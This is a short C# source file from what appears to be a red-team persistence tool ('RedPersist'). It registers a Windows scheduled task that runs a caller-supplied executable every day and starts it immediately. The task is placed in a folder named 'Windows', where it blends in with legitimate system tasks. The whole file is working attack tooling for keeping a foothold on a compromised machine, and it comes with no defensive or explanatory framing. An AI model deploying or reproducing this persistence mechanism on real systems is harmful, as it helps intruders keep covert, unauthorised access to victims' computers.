using System;
using Microsoft.Win32.TaskScheduler;

namespace RedPersist.Persist
{
 
    public class Schedule1
    {
        public static void Do(string[] args)
        {
            string taskName = args[1];
            TaskDefinition td = TaskService.Instance.NewTask();
            td.Triggers.Add(new DailyTrigger { DaysInterval = 1 });
            td.Actions.Add(new ExecAction(args[2]));
            var folder = TaskService.Instance.RootFolder.CreateFolder("Windows");
            folder.RegisterTaskDefinition(taskName, td).Run();
            Console.WriteLine("[*] Scheduled Task  created");
        }
    }
}